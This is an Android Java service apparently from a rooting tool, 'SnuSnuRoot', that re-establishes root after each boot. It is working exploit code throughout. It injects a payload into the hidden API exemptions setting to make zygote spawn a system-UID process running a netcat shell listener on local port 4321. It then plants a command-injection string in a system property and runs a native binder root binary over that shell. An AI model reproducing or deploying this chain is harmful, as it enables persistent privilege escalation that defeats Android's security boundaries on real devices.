package io.github.voidnullvalue.snusnuroot.persistence;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.IBinder;
import android.provider.Settings;
import android.util.Log;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.Socket;

public final class PersistenceService extends Service {
    private static final String TAG = "SnuSnuPersist";
    private static final String ENABLED_KEY = "snusnu_persist_enabled";
    private static final String STATUS_KEY = "snusnu_persist_status";
    private static final String REARM_STATUS_KEY = "snusnu_rearm_status";
    private static final String RETRY_COUNT_KEY = "snusnu_retry_count";
    private static final String NATIVE_RESULT_KEY = "snusnu_native_result";
    private static final String BOOT_ID_KEY = "snusnu_persist_boot_id";
    private static final String EXEMPTIONS = "hidden_api_blacklist_exemptions";
    private static final String TRIGGER =
            "x[$(sleep 30;/system/bin/sh /data/securedStorageLocation/w/b)]000";
    private static final int SYSTEM_CHANNEL_PORT = 4321;
    private static final int NOTIFICATION_ID = 31317;
    private static final String NOTIFICATION_CHANNEL = "snusnu_persistence";
    private static volatile boolean running;
    private static volatile boolean rerunRequested;
    private String currentBootId;

    @Override
    public void onCreate() {
        super.onCreate();
        NotificationManager manager = getSystemService(NotificationManager.class);
        NotificationChannel channel = new NotificationChannel(NOTIFICATION_CHANNEL,
                "SnuSnuRoot startup", NotificationManager.IMPORTANCE_LOW);
        channel.setDescription("Restores SnuSnuRoot after device startup");
        manager.createNotificationChannel(channel);
        Notification notification = new Notification.Builder(this, NOTIFICATION_CHANNEL)
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setContentTitle("SnuSnuRoot")
                .setContentText("Restoring privileged state")
                .setOngoing(true)
                .build();
        startForeground(NOTIFICATION_ID, notification);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        synchronized (PersistenceService.class) {
            if (running) {
                rerunRequested = true;
                return START_NOT_STICKY;
            }
            running = true;
        }
        new Thread(() -> {
            try {
                do {
                    rerunRequested = false;
                    runPersistence();
                    if (rerunRequested) {
                        try {
                            Thread.sleep(2000L);
                        } catch (InterruptedException interrupted) {
                            Thread.currentThread().interrupt();
                            break;
                        }
                    }
                } while (rerunRequested);
            } finally {
                running = false;
                stopSelf();
            }
        }, "snusnu-persist").start();
        return START_NOT_STICKY;
    }

    private void runPersistence() {
        ContentResolver resolver = getContentResolver();
        if (!"1".equals(Settings.Global.getString(resolver, ENABLED_KEY))) {
            Log.i(TAG, "disabled by global setting");
            return;
        }
        if (checkSelfPermission(Manifest.permission.WRITE_SECURE_SETTINGS)
                != PackageManager.PERMISSION_GRANTED) {
            report("missing_write_secure_settings");
            return;
        }
        String bootId = firstLine("/proc/sys/kernel/random/boot_id");
        Context deviceContext = createDeviceProtectedStorageContext();
        String previousBoot = deviceContext.getSharedPreferences("state", MODE_PRIVATE)
                .getString("last_boot_id", "");
        if (bootId != null && bootId.equals(previousBoot)) {
            Log.i(TAG, "already attempted this boot");
            return;
        }
        if (bootId != null) {
            currentBootId = bootId;
        }
        resolver.delete(Settings.Global.getUriFor(NATIVE_RESULT_KEY), null, null);
        Settings.Global.putString(resolver, REARM_STATUS_KEY, "pending");
        report("starting");

        /* Schedule the guard first, independently of exploit success. 4460N
         * normally leaves saved_time armed after time_update exits, but the
         * UID-1000 worker restores it if that vendor behavior ever changes. */
        if (!spawnSystemChannel()) {
            report("rearm_spawn_failed");
            return;
        }
        String worker = "(for i in $(seq 1 180); do "
                + "status=$(settings get global " + STATUS_KEY + "); "
                + "case \"$status\" in kernel_write_ok|*failed*) break ;; esac; sleep 1; done; "
                + "now=$(getprop persist.sys.saved_time); "
                + "if [ \"$now\" != '" + TRIGGER + "' ]; then "
                + "setprop persist.sys.saved_time '" + TRIGGER + "'; "
                + "now=$(getprop persist.sys.saved_time); fi; "
                + "if [ \"$now\" = '" + TRIGGER + "' ]; then "
                + "if [ \"$status\" = kernel_write_ok ]; then "
                + "printf '0\\n' > /data/securedStorageLocation/snusnu/state/retry_count; sync; "
                + "settings put global " + RETRY_COUNT_KEY + " 0; "
                + "settings put global " + REARM_STATUS_KEY + " ok; "
                + "else tries=$(cat /data/securedStorageLocation/snusnu/state/retry_count 2>/dev/null); "
                + "case \"$tries\" in ''|null|*[!0-9]*) tries=0 ;; esac; "
                + "tries=$((tries + 1)); "
                + "printf '%s\\n' \"$tries\" > /data/securedStorageLocation/snusnu/state/retry_count; "
                + "settings put global " + RETRY_COUNT_KEY + " \"$tries\"; sync; "
                + "settings put global " + REARM_STATUS_KEY + " \"failed_no_reboot_$tries\"; "
                + "log -t SnuSnuPersist \"native failure $status; left booted for manual recovery\"; fi; "
                + "log -t SnuSnuPersist 'trigger re-armed'; else "
                + "settings put global " + REARM_STATUS_KEY + " failed; "
                + "log -t SnuSnuPersist \"re-arm failed: $now\"; fi) >/dev/null 2>&1 & "
                + "printf '__SNU_REARM_SCHEDULED__\\n'; exit";
        String rearm = sendSystemCommand(worker);
        if (rearm == null || !rearm.contains("__SNU_REARM_SCHEDULED__")) {
            report("rearm_command_failed");
            return;
        }
        if (bootId != null) {
            deviceContext.getSharedPreferences("state", MODE_PRIVATE).edit()
                    .putString("last_boot_id", bootId).commit();
        }
        Log.i(TAG, "UID-1000 trigger guard scheduled");
        report("rearm_scheduled");

        String nativeResult = sendSystemCommand(
                "for i in $(seq 1 120); do "
                + "[ \"$(getprop sys.boot_completed)\" = 1 ] && break; sleep 1; done; "
                + "sleep 5; out=/data/securedStorageLocation/snusnu/state/native_result; "
                + "pidfile=/data/securedStorageLocation/snusnu/state/carrier_pid; "
                + "rm -f \"$out\"; /data/snusnu_hwbinder_root stateful-root-hold "
                + "</dev/null >\"$out\" 2>&1 & keeper=$!; "
                + "printf '%s\\n' \"$keeper\" >\"$pidfile\"; "
                + "for i in $(seq 1 180); do "
                + "if grep -q __SNU_NATIVE_0__ \"$out\" 2>/dev/null; then "
                + "cat \"$out\"; exit; fi; "
                + "if ! kill -0 \"$keeper\" 2>/dev/null; then cat \"$out\"; exit; fi; "
                + "sleep 1; done; cat \"$out\"; exit");
        Log.i(TAG, "system native result=" + nativeResult);
        Settings.Global.putString(getContentResolver(), NATIVE_RESULT_KEY,
                nativeResult == null ? "null" : nativeResult.trim().replace('\n', ';'));
        if (nativeResult == null || !nativeResult.contains("__SNU_NATIVE_0__")) {
            report("system_native_failed");
            return;
        }
        report("kernel_write_ok");
    }

    private boolean spawnSystemChannel() {
        String payload = "LClass1;->method1(\n"
                + "10\n"
                + "--runtime-args\n"
                + "--setuid=1000\n"
                + "--setgid=1000\n"
                + "--runtime-flags=2049\n"
                + "--mount-external-full\n"
                + "--setgroups=3003\n"
                + "--nice-name=snusnu-persist-system\n"
                + "--seinfo=platform:targetSdkVersion=28:complete\n"
                + "--invoke-with\n"
                + "toybox nc -s 127.0.0.1 -p 4321 -L /system/bin/sh -l;\n";
        boolean wrote = false;
        try {
            wrote = Settings.Global.putString(getContentResolver(), EXEMPTIONS, payload);
            /* The proven shell path has a process boundary between put/delete.
             * Give zygote's observer the same small delivery window while the
             * foreground service remains alive, then unconditionally clean. */
            Thread.sleep(150L);
        } catch (Throwable error) {
            Log.e(TAG, "zygote injection failed", error);
        } finally {
            try {
                getContentResolver().delete(Settings.Global.getUriFor(EXEMPTIONS),
                        null, null);
            } catch (Throwable error) {
                Log.e(TAG, "CRITICAL: exemptions cleanup failed", error);
            }
        }
        String leftover = Settings.Global.getString(getContentResolver(), EXEMPTIONS);
        if (leftover != null) {
            Log.e(TAG, "CRITICAL: exemptions value remains set; aborting");
            return false;
        }
        return wrote;
    }

    private String sendSystemCommand(String command) {
        for (int attempt = 0; attempt < 20; ++attempt) {
            try (Socket socket = new Socket(InetAddress.getByName("127.0.0.1"),
                    SYSTEM_CHANNEL_PORT)) {
                socket.setSoTimeout(120000);
                PrintWriter writer = new PrintWriter(
                        new OutputStreamWriter(socket.getOutputStream()), true);
                BufferedReader reader = new BufferedReader(
                        new InputStreamReader(socket.getInputStream()));
                writer.println(command);
                StringBuilder output = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append('\n');
                    if (line.contains("__SNU_REARM_SCHEDULED__")) break;
                }
                return output.toString();
            } catch (Throwable error) {
                try {
                    Thread.sleep(500L);
                } catch (InterruptedException interrupted) {
                    Thread.currentThread().interrupt();
                    return null;
                }
            }
        }
        return null;
    }

    private void report(String status) {
        Log.i(TAG, "result=" + status);
        try {
            Settings.Global.putString(getContentResolver(), STATUS_KEY, status);
            if (currentBootId != null) {
                Settings.Global.putString(getContentResolver(), BOOT_ID_KEY, currentBootId);
            }
        } catch (Throwable error) {
            Log.e(TAG, "status write failed", error);
        }
    }

    private static String firstLine(String path) {
        try (BufferedReader reader = new BufferedReader(new FileReader(path))) {
            return reader.readLine();
        } catch (Throwable error) {
            Log.e(TAG, "cannot read " + path, error);
            return null;
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
